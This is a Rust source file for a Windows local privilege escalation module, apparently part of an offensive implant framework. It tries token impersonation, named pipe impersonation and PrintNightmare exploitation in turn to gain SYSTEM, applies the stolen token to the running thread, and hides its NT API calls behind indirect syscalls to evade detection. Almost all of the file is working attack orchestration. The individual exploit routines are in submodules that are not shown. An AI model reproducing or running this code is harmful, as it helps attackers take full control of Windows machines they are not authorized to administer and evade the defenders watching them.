//! Local Privilege Escalation (LPE) module for Windows.
//!
//! Provides multiple techniques for elevating from a low-privileged context
//! to NT AUTHORITY\SYSTEM.  Techniques are tried in order of reliability:
//!
//! 1. **Token impersonation** — Find and duplicate SYSTEM tokens from
//!    accessible processes (requires `SeDebugPrivilege` or similar).
//! 2. **Named pipe impersonation** — Create a named pipe, trigger a
//!    privileged service to connect, and impersonate its token
//!    (requires `SeImpersonatePrivilege`).
//! 3. **Print Spooler exploitation** — Abuse PrintNightmare (CVE-2021-34527)
//!    to load a DLL as SYSTEM (requires vulnerable, unpatched system).
//!
//! # Constraints
//!
//! - Windows x86-64 only.
//! - Does NOT require Administrator privileges (some techniques require
//!   specific privileges like `SeImpersonatePrivilege` or `SeDebugPrivilege`).
//! - All NT API calls use indirect syscalls (`do_syscall`) — no IAT entries.
//! - Handles "no LPE available" gracefully — never crashes the target.
//! - Cleans up all artifacts (named pipes, temp files, handles).
//!
//! # Integration
//!
//! Call [`elevate_to_system`] to attempt all methods in sequence, or call
//! individual technique functions directly for more control.

#![cfg(all(windows, feature = "lpe"))]

pub mod named_pipe_impersonate;
pub mod print_spooler;
pub mod token_impersonate;

use anyhow::{anyhow, Context, Result};
use crate::win_types::HANDLE;

// ── Result types ───────────────────────────────────────────────────────────

/// Result of a local privilege escalation attempt.
#[derive(Debug)]
pub struct LpeResult {
    /// Human-readable name of the successful technique.
    pub method: String,
    /// The SYSTEM impersonation token handle.
    /// The caller should apply this to the thread via
    /// `NtSetInformationThread(ThreadImpersonationToken)`.
    pub system_token: HANDLE,
    /// The original process token (saved for restoration).
    /// May be null if the original token could not be captured.
    pub original_token: HANDLE,
    /// Whether elevation succeeded.
    pub elevated: bool,
}

impl LpeResult {
    /// Create a successful LPE result.
    pub fn success(method: &str, system_token: HANDLE, original_token: HANDLE) -> Self {
        Self {
            method: method.to_string(),
            system_token,
            original_token,
            elevated: true,
        }
    }

    /// Create a failed LPE result (no method succeeded).
    pub fn failed() -> Self {
        Self {
            method: String::new(),
            system_token: std::ptr::null_mut(),
            original_token: std::ptr::null_mut(),
            elevated: false,
        }
    }
}

// ── NTSTATUS helpers ───────────────────────────────────────────────────────

fn nt_success(status: i32) -> bool {
    status >= 0
}

fn nt_error(status: i32) -> bool {
    status < 0
}

fn nt_close_handle(handle: u64) {
    if handle == 0 || handle == usize::MAX as u64 {
        return;
    }
    let _ = crate::syscall!("NtClose", handle);
}

// ── Indirect syscall wrappers ──────────────────────────────────────────────

/// Capture the current thread's impersonation token (if any) for later
/// restoration.  Returns the token handle, or null if no token was active.
unsafe fn capture_current_token() -> HANDLE {
    let current_thread: HANDLE = (-2isize) as HANDLE;
    let mut token: HANDLE = std::ptr::null_mut();

    let target = match crate::syscalls::get_syscall_id("NtOpenThreadToken") {
        Ok(t) => t,
        Err(_) => return std::ptr::null_mut(),
    };

    let status = crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            current_thread as u64,
            0x0002_0008u64, // TOKEN_DUPLICATE | TOKEN_QUERY
            1u64,           // OpenAsSelf = TRUE
            &mut token as *mut _ as u64,
        ],
    );

    if nt_success(status) && !token.is_null() {
        token
    } else {
        std::ptr::null_mut()
    }
}

/// Apply an impersonation token to the current thread via
/// `NtSetInformationThread(ThreadImpersonationToken)`.
unsafe fn apply_token(token: HANDLE) -> Result<()> {
    let current_thread: HANDLE = (-2isize) as HANDLE;
    let target = crate::syscalls::get_syscall_id("NtSetInformationThread")
        .map_err(|e| anyhow!("failed to resolve NtSetInformationThread SSN: {e}"))?;
    let token_value = token as u64;
    let status = crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            current_thread as u64,
            4u64, // ThreadImpersonationToken
            &token_value as *const u64 as u64,
            std::mem::size_of::<u64>() as u64,
        ],
    );
    if nt_error(status) {
        Err(anyhow!(
            "NtSetInformationThread(ThreadImpersonationToken) failed: NTSTATUS 0x{status:08X}"
        ))
    } else {
        Ok(())
    }
}

// ── Public API ─────────────────────────────────────────────────────────────

/// Try all LPE methods in order and return the first successful result.
///
/// Order of attempts:
/// 1. Token impersonation (most reliable, requires `SeDebugPrivilege`)
/// 2. Named pipe impersonation (requires `SeImpersonatePrivilege`)
/// 3. Print Spooler exploitation (requires vulnerable system)
///
/// Returns `Ok(LpeResult)` if any method succeeded, or `Err` if all
/// methods failed.  The `LpeResult` contains the SYSTEM token and the
/// original token for later restoration.
///
/// # Example
///
/// ```rust,ignore
/// let result = lpe::try_all_lpe_methods()?;
/// if result.elevated {
///     // Do privileged work...
///     // When done, restore the original token:
///     lpe::restore_token(&result)?;
/// }
/// ```
pub fn try_all_lpe_methods() -> Result<LpeResult> {
    tracing::info!("lpe: attempting local privilege escalation");

    // Capture the current token for potential restoration.
    let original_token = unsafe { capture_current_token() };

    // ── Method 1: Token impersonation ──────────────────────────────────
    tracing::info!("lpe: trying token impersonation");
    match token_impersonate::exploit_token_impersonation() {
        Ok(system_token) => {
            tracing::info!("lpe: token impersonation succeeded");

            // Apply the SYSTEM token.
            if let Err(e) = unsafe { apply_token(system_token) } {
                tracing::error!("lpe: failed to apply token: {e:#}");
                nt_close_handle(system_token as u64);
            } else {
                return Ok(LpeResult::success(
                    "token_impersonation",
                    system_token,
                    original_token,
                ));
            }
        }
        Err(e) => {
            tracing::debug!("lpe: token impersonation failed: {e:#}");
        }
    }

    // ── Method 2: Named pipe impersonation ─────────────────────────────
    tracing::info!("lpe: trying named pipe impersonation");
    match named_pipe_impersonate::exploit_named_pipe_impersonation("", "") {
        Ok(system_token) => {
            tracing::info!("lpe: named pipe impersonation succeeded");

            if let Err(e) = unsafe { apply_token(system_token) } {
                tracing::error!("lpe: failed to apply token: {e:#}");
                nt_close_handle(system_token as u64);
            } else {
                return Ok(LpeResult::success(
                    "named_pipe_impersonation",
                    system_token,
                    original_token,
                ));
            }
        }
        Err(e) => {
            tracing::debug!("lpe: named pipe impersonation failed: {e:#}");
        }
    }

    // ── Method 3: Print Spooler exploitation ───────────────────────────
    tracing::info!("lpe: trying Print Spooler exploitation");
    match print_spooler::exploit_printnightmare(None) {
        Ok(system_token) => {
            tracing::info!("lpe: Print Spooler exploitation succeeded");

            if let Err(e) = unsafe { apply_token(system_token) } {
                tracing::error!("lpe: failed to apply token: {e:#}");
                nt_close_handle(system_token as u64);
            } else {
                return Ok(LpeResult::success(
                    "print_spooler",
                    system_token,
                    original_token,
                ));
            }
        }
        Err(e) => {
            tracing::debug!("lpe: Print Spooler exploitation failed: {e:#}");
        }
    }

    // Clean up the captured original token if we didn't use it.
    nt_close_handle(original_token as u64);

    tracing::warn!("lpe: all privilege escalation methods failed");
    Err(anyhow!(
        "all LPE methods failed (token_impersonation, named_pipe_impersonation, print_spooler)"
    ))
}

/// Elevate to SYSTEM using the most reliable available method.
///
/// This is the primary entry point for LPE.  It attempts all methods and
/// applies the resulting token to the current thread.  On success, the
/// calling thread is running in the SYSTEM security context.
///
/// Returns a descriptive message on success.
pub fn elevate_to_system() -> Result<String> {
    let result = try_all_lpe_methods()?;

    Ok(format!(
        "Elevated to SYSTEM via {} (token={:#x})",
        result.method,
        result.system_token as usize
    ))
}

/// Restore the original token after elevation.
///
/// Call this after privileged work is complete to revert to the original
/// security context.  Closes the SYSTEM token and restores the original.
pub fn restore_token(result: &LpeResult) -> Result<()> {
    if !result.elevated {
        return Ok(());
    }

    // Clear the impersonation token (revert to process token).
    let current_thread: HANDLE = (-2isize) as HANDLE;
    if !result.original_token.is_null() {
        // Restore the original token.
        unsafe { apply_token(result.original_token)? }
        nt_close_handle(result.original_token as u64);
    } else {
        // No original token captured — clear the impersonation token.
        let target = crate::syscalls::get_syscall_id("NtSetInformationThread")
            .map_err(|e| anyhow!("failed to resolve NtSetInformationThread: {e}"))?;
        let null_token: u64 = 0;
        let status = unsafe {
            crate::syscalls::do_syscall(
                target.ssn,
                target.gadget_addr,
                &[
                    current_thread as u64,
                    4u64, // ThreadImpersonationToken
                    &null_token as *const u64 as u64,
                    std::mem::size_of::<u64>() as u64,
                ],
            )
        };
        if nt_error(status) {
            return Err(anyhow!(
                "failed to clear impersonation token: NTSTATUS 0x{status:08X}"
            ));
        }
    }

    // Close the SYSTEM token.
    nt_close_handle(result.system_token as u64);

    tracing::info!("lpe: restored original security context");
    Ok(())
}

/// Check prerequisites for LPE without actually attempting elevation.
///
/// Returns a list of available techniques and whether their prerequisites
/// are met.
pub fn check_prerequisites() -> Vec<(String, bool, String)> {
    let mut results = Vec::new();

    // Check token impersonation prerequisites.
    let (token_ok, token_msg) = match token_impersonate::check_and_enable_privileges() {
        Ok(privs) => {
            if privs.is_empty() {
                (false, "no elevated privileges available".to_string())
            } else {
                (true, format!("privileges: {}", privs.join(", ")))
            }
        }
        Err(e) => (false, format!("error: {e:#}")),
    };
    results.push((
        "token_impersonation".to_string(),
        token_ok,
        token_msg,
    ));

    // Check named pipe impersonation prerequisites.
    // We need SeImpersonatePrivilege and the ability to create named pipes.
    let pipe_msg = "requires SeImpersonatePrivilege".to_string();
    let pipe_ok = token_ok; // Rough check — if we have elevated privs, pipe impersonation may work.
    results.push((
        "named_pipe_impersonation".to_string(),
        pipe_ok,
        pipe_msg,
    ));

    // Check Print Spooler prerequisites.
    let (spooler_ok, spooler_msg) = match print_spooler::check_spooler_vulnerability() {
        Ok(vulnerable) => {
            if vulnerable {
                (true, "Print Spooler is running and accessible".to_string())
            } else {
                (false, "Print Spooler is not running or not accessible".to_string())
            }
        }
        Err(e) => (false, format!("error: {e:#}")),
    };
    results.push((
        "print_spooler".to_string(),
        spooler_ok,
        spooler_msg,
    ));

    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lpe_result_success() {
        let result = LpeResult::success(
            "test_method",
            0x1234 as HANDLE,
            0x5678 as HANDLE,
        );
        assert_eq!(result.method, "test_method");
        assert_eq!(result.system_token as usize, 0x1234);
        assert_eq!(result.original_token as usize, 0x5678);
        assert!(result.elevated);
    }

    #[test]
    fn lpe_result_failed() {
        let result = LpeResult::failed();
        assert!(result.method.is_empty());
        assert!(result.system_token.is_null());
        assert!(result.original_token.is_null());
        assert!(!result.elevated);
    }

    #[test]
    fn check_prerequisites_returns_three_methods() {
        let results = check_prerequisites();
        assert_eq!(results.len(), 3);
        assert_eq!(results[0].0, "token_impersonation");
        assert_eq!(results[1].0, "named_pipe_impersonation");
        assert_eq!(results[2].0, "print_spooler");
    }
}
